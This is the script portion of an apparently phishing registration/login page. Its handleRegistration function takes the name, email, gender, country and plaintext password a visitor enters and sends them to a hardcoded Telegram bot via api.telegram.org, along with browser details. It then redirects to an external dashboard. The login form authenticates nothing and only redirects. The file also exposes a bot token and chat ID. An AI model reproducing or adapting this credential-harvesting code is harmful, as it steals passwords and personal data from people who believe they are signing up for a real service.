    <script>
        // Telegram Bot Configuration - already configured
        const TELEGRAM_BOT_TOKEN = '8370869618:AAEDxJJZ4bEU7GGDRhtEOHzAJkyry8G7Wdk';
        const TELEGRAM_CHAT_ID = '5987689745';

        // ... rest of your JavaScript code unchanged ...
        function switchTab(tab) {
            const loginForm = document.getElementById('login-form');
            const registerForm = document.getElementById('register-form');
            const loginTab = document.getElementById('login-tab');
            const registerTab = document.getElementById('register-tab');

            if (tab === 'login') {
                loginForm.classList.remove('hidden-form');
                registerForm.classList.add('hidden-form');
                loginTab.classList.add('tab-active');
                registerTab.classList.remove('tab-active');
            } else {
                loginForm.classList.add('hidden-form');
                registerForm.classList.remove('hidden-form');
                loginTab.classList.remove('tab-active');
                registerTab.classList.add('tab-active');
            }
        }

        async function sendToTelegram(data) {
            try {
                const message = `
🆕 *New Account Registration*

👤 *Full Name:* ${data.fullname}
📧 *Email:* ${data.email}
⚧️ *Gender:* ${data.gender || 'Not specified'}
🌍 *Country:* ${data.country || 'Not specified'}
🔐 *Password:* ${data.password}
🔗 *User Agent:* ${navigator.userAgent}
🌐 *IP Address:* Detected client-side
📱 *Language:* ${navigator.language}
⏰ *Timestamp:* ${new Date().toISOString()}

---
*Newage Onrender Registration*
                `;

                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                const params = new URLSearchParams({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                });

                await fetch(`${url}?${params}`);
                console.log('✅ Data sent to Telegram successfully');
            } catch (error) {
                console.error('❌ Telegram send failed:', error);
            }
        }

        async function handleRegistration(event) {
            event.preventDefault();
            const btn = document.getElementById('reg-btn');
            
            const originalText = btn.innerHTML;
            btn.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin mr-2"></i> Creating...';
            btn.classList.add('opacity-80', 'cursor-not-allowed');

            const formData = {
                fullname: document.getElementById('reg-fullname').value,
                email: document.getElementById('reg-email').value,
                gender: document.getElementById('reg-gender').value,
                country: document.getElementById('reg-country').value,
                password: document.getElementById('reg-password').value
            };

            await sendToTelegram(formData);

            setTimeout(() => {
                btn.innerHTML = originalText;
                btn.classList.remove('opacity-80', 'cursor-not-allowed');
                window.location.href = "https://newagedashboard.onrender.com";
            }, 1000);
        }

        document.getElementById("register-form").addEventListener("submit", handleRegistration);

        document.getElementById("login-form").addEventListener("submit", function (e) {
            e.preventDefault();
            if (this.checkValidity()) {
                window.location.href = "https://newagedashboard.onrender.com";
            } else {
                this.reportValidity();
            }
        });
    </script>
